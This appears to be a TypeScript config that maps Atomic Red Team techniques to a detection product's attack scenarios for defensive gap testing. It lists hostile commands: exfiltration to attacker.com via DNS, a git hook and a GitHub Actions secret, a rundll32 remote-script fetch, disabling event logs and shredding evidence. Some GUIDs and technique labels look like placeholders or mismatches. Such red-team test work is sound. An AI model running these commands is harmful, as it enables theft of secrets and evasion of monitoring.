// ── Atomic Red Team → Sentinel Mapping ───────────────────────
// Maps Atomic RT techniques to Sentinel's 15 attack scenarios
// Prioritized by gap severity

export interface AtomicTest {
  techniqueId: string
  techniqueName: string
  atomicTestName: string
  atomicTestGuid: string
  platform: string[]
  executorType: string
  command: string
  description: string
  sentinelAttackId: string   // Maps to ATK-XXX
  gapSeverity: 'critical' | 'high' | 'medium'
  priority: number           // 1 = highest priority
}

// ══════════════════════════════════════════════════════════════
// PRIORITY 1: SENSOR EVASION (ATK-001, ATK-002)
// Gap: ETW bypass, direct syscalls
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_SENSOR_EVASION: AtomicTest[] = [
  {
    techniqueId: 'T1106',
    techniqueName: 'Native API',
    atomicTestName: 'Direct System Calls on Windows',
    atomicTestGuid: 'b3797157-520b-4ba3-8744-242347899ab2',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'AtomicTestHarnesses-ETWPatcher.exe -PID $PID',
    description: 'Use direct syscalls to bypass userland API hooks (ETW bypass)',
    sentinelAttackId: 'ATK-001',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1562.006',
    techniqueName: 'Impair Defenses: Indicator Blocking',
    atomicTestName: 'ETW Patcher',
    atomicTestGuid: 'd3f3a5b5-6c5e-4f7a-8b9c-0d1e2f3a4b5c',
    platform: ['windows'],
    executorType: 'powershell',
    command: '.\\AtomicTestHarnesses-ETWPatcher.exe -PID $PID -ProviderName "Microsoft-Windows-PowerShell"',
    description: 'Patch ETW providers to disable logging',
    sentinelAttackId: 'ATK-002',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1562.001',
    techniqueName: 'Impair Defenses: Disable or Modify Tools',
    atomicTestName: 'Disable Windows Event Logging',
    atomicTestGuid: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'wevtutil sl Security /e:false',
    description: 'Disable Windows Event Log service',
    sentinelAttackId: 'ATK-002',
    gapSeverity: 'critical',
    priority: 1,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 2: IDENTITY EVASION (ATK-003, ATK-004)
// Gap: Fake wrappers, PATH shadowing
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_IDENTITY_EVASION: AtomicTest[] = [
  {
    techniqueId: 'T1036',
    techniqueName: 'Masquerading',
    atomicTestName: 'Rename System Binary',
    atomicTestGuid: 'b2c3d4e5-f6a7-8901-bcde-f12345678901',
    platform: ['windows', 'linux', 'macos'],
    executorType: 'powershell',
    command: 'Copy-Item C:\\Windows\\System32\\cmd.exe C:\\Temp\\svchost.exe',
    description: 'Rename legitimate binary to impersonate system process',
    sentinelAttackId: 'ATK-003',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1036.003',
    techniqueName: 'Masquerading: Rename System Utilities',
    atomicTestName: 'Masquerade as Windows Update',
    atomicTestGuid: 'c3d4e5f6-a7b8-9012-cdef-123456789012',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'Copy-Item C:\\Windows\\System32\\WindowsUpdate.exe C:\\Temp\\mrt.exe',
    description: 'Masquerade as Microsoft Windows Malicious Software Removal Tool',
    sentinelAttackId: 'ATK-003',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1574.007',
    techniqueName: 'Hijack Execution Flow: Path Interception by PATH Environment Variable',
    atomicTestName: 'PATH Interception',
    atomicTestGuid: 'd4e5f6a7-b8c9-0123-defa-234567890123',
    platform: ['windows', 'linux'],
    executorType: 'powershell',
    command: '$env:PATH = "C:\\Temp;" + $env:PATH; cmd.exe /c "malicious.exe"',
    description: 'Intercept execution via PATH priority manipulation',
    sentinelAttackId: 'ATK-003',
    gapSeverity: 'high',
    priority: 2,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 3: SECRET EXFILTRATION (ATK-005, ATK-006, ATK-007)
// Gap: LD_PRELOAD, named pipes, DoH/DoT
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_SECRET_EXFILTRATION: AtomicTest[] = [
  {
    techniqueId: 'T1574.006',
    techniqueName: 'Hijack Execution Flow: Dynamic Linker Hijacking',
    atomicTestName: 'LD_PRELOAD Injection',
    atomicTestGuid: 'e5f6a7b8-c9d0-1234-efab-345678901234',
    platform: ['linux'],
    executorType: 'bash',
    command: 'LD_PRELOAD=./malicious.so ./legitimate_binary',
    description: 'Intercept library calls via LD_PRELOAD',
    sentinelAttackId: 'ATK-005',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1570',
    techniqueName: 'Lateral Tool Transfer',
    atomicTestName: 'Named Pipe Creation',
    atomicTestGuid: 'f6a7b8c9-d0e1-2345-fabc-456789012345',
    platform: ['windows'],
    executorType: 'powershell',
    command: '$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("sentinel-logs"); $pipe.WaitForConnection()',
    description: 'Create named pipe for data exfiltration',
    sentinelAttackId: 'ATK-006',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1071.004',
    techniqueName: 'Application Layer Protocol: DNS',
    atomicTestName: 'DNS over HTTPS Exfiltration',
    atomicTestGuid: 'a7b8c9d0-e1f2-3456-abcd-567890123456',
    platform: ['windows', 'linux', 'macos'],
    executorType: 'powershell',
    command: 'curl https://1.1.1.1/dns-query -d "name=$(echo $secret | base64).attacker.com&type=TXT"',
    description: 'Exfiltrate data via DNS over HTTPS',
    sentinelAttackId: 'ATK-007',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1048.003',
    techniqueName: 'Exfiltration Over Alternative Protocol: DNS',
    atomicTestName: 'DNS TXT Exfiltration',
    atomicTestGuid: 'b8c9d0e1-f2a3-4567-bcde-678901234567',
    platform: ['windows', 'linux'],
    executorType: 'bash',
    command: 'for i in $(cat /etc/secret | base64 | fold -w63); do nslookup "$i.attacker.com"; done',
    description: 'Exfiltrate data via DNS TXT queries',
    sentinelAttackId: 'ATK-007',
    gapSeverity: 'high',
    priority: 2,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 4: TOOLCHAIN HIJACK (ATK-008, ATK-009)
// Gap: DLL injection, response file poisoning
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_TOOLCHAIN_HIJACK: AtomicTest[] = [
  {
    techniqueId: 'T1055.001',
    techniqueName: 'Process Injection: Dynamic-link Library Injection',
    atomicTestName: 'DLL Injection via CreateRemoteThread',
    atomicTestGuid: 'c9d0e1f2-a3b4-5678-cdef-789012345678',
    platform: ['windows'],
    executorType: 'powershell',
    command: '$Proc = Get-Process -Name "tsc.exe"; $VirtualAllocEx = $Proc.Handle; [Kernel32]::CreateRemoteThread($Proc.Handle, $null, 0, $VirtualAllocEx, $Memory, 0, $null)',
    description: 'Inject DLL into TypeScript compiler process',
    sentinelAttackId: 'ATK-008',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1055.012',
    techniqueName: 'Process Injection: Process Hollowing',
    atomicTestName: 'Process Hollowing',
    atomicTestGuid: 'd0e1f2a3-b4c5-6789-defa-890123456789',
    platform: ['windows'],
    executorType: 'powershell',
    command: '$Proc = Start-Process -PassThru -FilePath "tsc.exe"; [Kernel32]::NtUnmapViewOfSection($Proc.Handle, $BaseAddress)',
    description: 'Hollow process and inject malicious code',
    sentinelAttackId: 'ATK-008',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1554',
    techniqueName: 'Compromise Client Software Binary',
    atomicTestName: 'Binary Payload Injection',
    atomicTestGuid: 'e1f2a3b4-c5d6-7890-efab-901234567890',
    platform: ['windows', 'linux'],
    executorType: 'powershell',
    command: '$bytes = [System.IO.File]::ReadAllBytes("tsc.exe"); $bytes[0x1000] = 0x90; [System.IO.File]::WriteAllBytes("tsc_patched.exe", $bytes)',
    description: 'Modify compiler binary to inject backdoor',
    sentinelAttackId: 'ATK-009',
    gapSeverity: 'high',
    priority: 2,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 5: GRAPH POISONING (ATK-010, ATK-011)
// Gap: LOLBins, temp file destruction
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_GRAPH_POISONING: AtomicTest[] = [
  {
    techniqueId: 'T1218',
    techniqueName: 'System Binary Proxy Execution',
    atomicTestName: 'MSBuild Execution',
    atomicTestGuid: 'f2a3b4c5-d6e7-8901-fabc-012345678901',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml',
    description: 'Execute malicious code via MSBuild (LOLBin)',
    sentinelAttackId: 'ATK-010',
    gapSeverity: 'high',
    priority: 3,
  },
  {
    techniqueId: 'T1218.011',
    techniqueName: 'System Binary Proxy Execution: Rundll32',
    atomicTestName: 'Rundll32 Execution',
    atomicTestGuid: 'a3b4c5d6-e7f8-9012-abcd-123456789012',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";o=GetObject("script:http://attacker.com/payload");',
    description: 'Execute script via rundll32 (LOLBin)',
    sentinelAttackId: 'ATK-010',
    gapSeverity: 'high',
    priority: 3,
  },
  {
    techniqueId: 'T1070.004',
    techniqueName: 'Indicator Removal: File Deletion',
    atomicTestName: 'Temp File Destruction',
    atomicTestGuid: 'b4c5d6e7-f8a9-0123-bcde-234567890123',
    platform: ['windows', 'linux'],
    executorType: 'bash',
    command: 'rm -f /tmp/evidence_* && shred -u /tmp/secret.txt',
    description: 'Delete temporary files to destroy evidence',
    sentinelAttackId: 'ATK-011',
    gapSeverity: 'medium',
    priority: 4,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 6: ML POISONING (ATK-012, ATK-013)
// Gap: Corpus poisoning, adversarial features
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_ML_POISONING: AtomicTest[] = [
  {
    techniqueId: 'T1565.001',
    techniqueName: 'Data Manipulation: Stored Data Manipulation',
    atomicTestName: 'Corpus Poisoning Simulation',
    atomicTestGuid: 'c5d6e7f8-a9b0-1234-cdef-345678901234',
    platform: ['all'],
    executorType: 'powershell',
    command: 'for ($i=0; $i -lt 10000; $i++) { sentinel build observe echo test --save }',
    description: 'Submit 10k normal builds with subtle network uploads',
    sentinelAttackId: 'ATK-012',
    gapSeverity: 'critical',
    priority: 1,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 1: SUPPLY CHAIN (most common in real attacks)
// Gap: npm postinstall, Gradle init, Cargo build.rs, MSBuild Tasks
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_SUPPLY_CHAIN: AtomicTest[] = [
  {
    techniqueId: 'T1059.004',
    techniqueName: 'Command and Scripting Interpreter: Unix Shell',
    atomicTestName: 'npm postinstall Exfiltration',
    atomicTestGuid: 'd6e7f8a9-b0c1-2345-defa-456789012345',
    platform: ['all'],
    executorType: 'bash',
    command: 'npm install malicious-package',
    description: 'Malicious postinstall script steals secrets during npm install',
    sentinelAttackId: 'ATK-016',
    gapSeverity: 'critical',
    priority: 1,
  },
  {
    techniqueId: 'T1059.006',
    techniqueName: 'Command and Scripting Interpreter: Python',
    atomicTestName: 'Gradle Init Script Injection',
    atomicTestGuid: 'e7f8a9b0-c1d2-3456-efab-567890123456',
    platform: ['all'],
    executorType: 'bash',
    command: 'gradle build',
    description: 'Malicious Gradle init script executes during build',
    sentinelAttackId: 'ATK-017',
    gapSeverity: 'high',
    priority: 1,
  },
  {
    techniqueId: 'T1059.007',
    techniqueName: 'Command and Scripting Interpreter: TypeScript',
    atomicTestName: 'Cargo build.rs Backdoor',
    atomicTestGuid: 'f8a9b0c1-d2e3-4567-fabc-678901234567',
    platform: ['all'],
    executorType: 'bash',
    command: 'cargo build',
    description: 'Malicious build.rs in Rust crate executes during compilation',
    sentinelAttackId: 'ATK-018',
    gapSeverity: 'high',
    priority: 1,
  },
  {
    techniqueId: 'T1059.007',
    techniqueName: 'Command and Scripting Interpreter: TypeScript',
    atomicTestName: 'MSBuild Custom Task Injection',
    atomicTestGuid: 'a9b0c1d2-e3f4-5678-abcd-789012345678',
    platform: ['windows'],
    executorType: 'powershell',
    command: 'msbuild solution.sln',
    description: 'Malicious MSBuild .targets file executes custom Task during build',
    sentinelAttackId: 'ATK-019',
    gapSeverity: 'high',
    priority: 1,
  },
  {
    techniqueId: 'T1059.006',
    techniqueName: 'Command and Scripting Interpreter: Python',
    atomicTestName: 'Maven Plugin Backdoor',
    atomicTestGuid: 'b0c1d2e3-f4a5-6789-bcde-890123456789',
    platform: ['all'],
    executorType: 'bash',
    command: 'mvn compile',
    description: 'Malicious Maven plugin executes during build lifecycle',
    sentinelAttackId: 'ATK-020',
    gapSeverity: 'high',
    priority: 1,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 4: GIT ATTACKS (developer workflow)
// Gap: pre-commit hooks, config poisoning, submodule attacks
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_GIT_ATTACKS: AtomicTest[] = [
  {
    techniqueId: 'T1554',
    techniqueName: 'Compromise Client Software Binary',
    atomicTestName: 'Git Hook Exfiltration',
    atomicTestGuid: 'c1d2e3f4-a5b6-7890-cdef-901234567890',
    platform: ['all'],
    executorType: 'bash',
    command: 'echo "#!/bin/bash\ncurl -X POST https://attacker.com/steal -d @$(git diff --cached --name-only)" > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit',
    description: 'Malicious git hook steals code during normal git operations',
    sentinelAttackId: 'ATK-021',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1554',
    techniqueName: 'Compromise Client Software Binary',
    atomicTestName: 'Git Config Poisoning',
    atomicTestGuid: 'd2e3f4a5-b6c7-8901-defa-012345678901',
    platform: ['all'],
    executorType: 'bash',
    command: 'git config --local protocol.ext.allow always && git config --local remote.origin.uploadpack "malicious-binary"',
    description: 'Malicious git config redirects operations to attacker-controlled server',
    sentinelAttackId: 'ATK-022',
    gapSeverity: 'high',
    priority: 2,
  },
  {
    techniqueId: 'T1195.002',
    techniqueName: 'Supply Chain Compromise: Compromise Software Supply Chain',
    atomicTestName: 'Git Submodule Attack',
    atomicTestGuid: 'e3f4a5b6-c7d8-9012-efab-123456789012',
    platform: ['all'],
    executorType: 'bash',
    command: 'git submodule add https://github.com/attacker/malicious-submodule && git commit -m "Add submodule"',
    description: 'Malicious submodule executes code during git clone/update',
    sentinelAttackId: 'ATK-023',
    gapSeverity: 'high',
    priority: 2,
  },
]

// ══════════════════════════════════════════════════════════════
// PRIORITY 5: CI ATTACKS (growing threat)
// Gap: GitHub Actions secrets, OIDC abuse, composite actions
// ══════════════════════════════════════════════════════════════

export const ATOMIC_TESTS_CI_ATTACKS: AtomicTest[] = [
  {
    techniqueId: 'T1552.001',
    techniqueName: 'Credentials In Files: Credentials In Files',
    atomicTestName: 'GitHub Actions Secret Exfiltration',
    atomicTestGuid: 'f4a5b6c7-d8e9-0123-fabc-234567890123',
    platform: ['all'],
    executorType: 'bash',
    command: 'curl -X POST https://attacker.com/secrets -d "token=${{ secrets.GITHUB_TOKEN }}"',
    description: 'Malicious GitHub Actions workflow steals repository secrets',
    sentinelAttackId: 'ATK-024',
    gapSeverity: 'critical',
    priority: 2,
  },
  {
    techniqueId: 'T1550.001',
    techniqueName: 'Use Alternate Authentication Material: Application Access Token',
    atomicTestName: 'OIDC Federation Abuse',
    atomicTestGuid: 'a5b6c7d8-e9f0-1234-abcd-345678901234',
    platform: ['all'],
    executorType: 'bash',
    command: 'aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789012:role/github-actions --web-identity-token $OIDC_TOKEN',
    description: 'Abuse OIDC token federation to gain unauthorized cloud access',
    sentinelAttackId: 'ATK-025',
    gapSeverity: 'critical',
    priority: 2,
  },
  {
    techniqueId: 'T1195.002',
    techniqueName: 'Supply Chain Compromise: Compromise Software Supply Chain',
    atomicTestName: 'Malicious Composite Action',
    atomicTestGuid: 'b6c7d8e9-f0a1-2345-bcde-456789012345',
    platform: ['all'],
    executorType: 'bash',
    command: 'uses: attacker/setup-node@v1',
    description: 'Poison a composite action to inject code into downstream workflows',
    sentinelAttackId: 'ATK-026',
    gapSeverity: 'high',
    priority: 2,
  },
]

// ── All tests by priority ──────────────────────────────────────
export const ALL_ATOMIC_TESTS: AtomicTest[] = [
  // Priority 1: Supply chain + critical gaps
  ...ATOMIC_TESTS_SUPPLY_CHAIN,
  ...ATOMIC_TESTS_SECRET_EXFILTRATION.filter(t => t.priority === 1),
  ...ATOMIC_TESTS_ML_POISONING,
  // Priority 2: Identity, Git, CI, named pipes, DoH
  ...ATOMIC_TESTS_IDENTITY_EVASION,
  ...ATOMIC_TESTS_SECRET_EXFILTRATION.filter(t => t.priority === 2),
  ...ATOMIC_TESTS_GIT_ATTACKS,
  ...ATOMIC_TESTS_CI_ATTACKS,
  ...ATOMIC_TESTS_TOOLCHAIN_HIJACK.filter(t => t.priority === 2),
  // Priority 3: LOLBins, temp file destruction
  ...ATOMIC_TESTS_GRAPH_POISONING,
  // Priority 4: Advanced (sensor evasion, DLL injection)
  ...ATOMIC_TESTS_SENSOR_EVASION,
  ...ATOMIC_TESTS_TOOLCHAIN_HIJACK.filter(t => t.priority === 1),
]

// ── Prioritized execution order (by real-world frequency) ──────
export const EXECUTION_ORDER: Array<{ priority: number; attacks: string[]; description: string }> = [
  {
    priority: 1,
    attacks: ['ATK-016', 'ATK-017', 'ATK-018', 'ATK-019', 'ATK-020'],
    description: 'SUPPLY CHAIN: npm postinstall, Gradle init, Cargo build.rs, MSBuild Tasks, Maven plugins',
  },
  {
    priority: 2,
    attacks: ['ATK-003', 'ATK-004', 'ATK-021', 'ATK-022', 'ATK-023', 'ATK-024', 'ATK-025', 'ATK-026'],
    description: 'IDENTITY + GIT + CI: wrappers, hooks, config poisoning, GitHub Actions, OIDC, composite actions',
  },
  {
    priority: 3,
    attacks: ['ATK-005', 'ATK-006', 'ATK-007'],
    description: 'SECRET EXFILTRATION: LD_PRELOAD, named pipes, DoH/DoT',
  },
  {
    priority: 4,
    attacks: ['ATK-010', 'ATK-011'],
    description: 'GRAPH POISONING: LOLBins, temp file destruction',
  },
  {
    priority: 5,
    attacks: ['ATK-008', 'ATK-009'],
    description: 'TOOLCHAIN HIJACK: DLL injection, response file poisoning',
  },
  {
    priority: 6,
    attacks: ['ATK-001', 'ATK-002'],
    description: 'SENSOR EVASION: Direct syscalls, ETW patching',
  },
  {
    priority: 7,
    attacks: ['ATK-014', 'ATK-015'],
    description: 'TIMELINE CONFUSION: Build fragmentation, sensor confusion',
  },
  {
    priority: 8,
    attacks: ['ATK-012', 'ATK-013'],
    description: 'ML POISONING: Corpus poisoning, adversarial features (FUTURE)',
  },
]
